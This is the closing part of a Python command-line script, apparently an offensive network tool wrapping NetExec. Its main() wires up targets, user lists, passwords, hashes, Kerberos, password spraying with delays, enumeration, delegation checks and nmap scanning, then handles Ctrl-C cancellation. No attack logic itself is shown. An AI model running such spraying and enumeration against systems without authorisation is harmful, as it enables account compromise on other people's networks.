        protocols = parse_protocol_list(args.protocols)
        if not protocols:
            raise ValueError("No protocols selected.")
        log_file   = args.output or datetime.now().strftime("%Y-%m-%d_%H-%M-%S") + ".txt"
        extra_hash = hashes[0] if hashes else None

        runner = NxcPlus(
            targets=targets, users=users, passwords=passwords,
            hashes=hashes, kerberos=args.kerberos,
            protocols=protocols, log_file=log_file,
            creds_file=args.creds_file, json_out=args.json_output,
            save_file=args.save, script_file=args.script,
            workers=args.workers, target_workers=args.target_workers,
            quiet=args.quiet, verbose=args.verbose,
            debug=args.debug, no_port_probe=args.no_port_probe,
            extra_hash=extra_hash,
            spray=args.spray, spray_delay=args.spray_delay,
            auto_enum=not args.no_enum, timeout_skip=args.timeout_skip,
            deleg=not args.no_deleg,
            nmap=not args.no_nmap, nmap_full=args.full,
            nmap_top=args.nmap_top, nmap_rate=args.nmap_rate,
            nmap_timeout=args.nmap_timeout,
        )
    except ValueError as exc:
        print(f"{RED}{BOLD}Error:{RESET} {exc}", file=sys.stderr)
        if tee: tee.close()
        return 1

    interrupted = {"n": 0}
    def _sigint(_sig, _frame):
        interrupted["n"] += 1
        if interrupted["n"] == 1:
            sys.stderr.write("\r\033[K\n[!] Cancelling — Ctrl-C again to force.\n")
            sys.stderr.flush()
            runner.cancel()
        else:
            os._exit(130)
    signal.signal(signal.SIGINT, _sigint)

    try:
        return runner.run()
    except KeyboardInterrupt:
        runner.cancel(); return 130
    finally:
        if tee: tee.close()


if __name__ == "__main__":
    sys.exit(main())
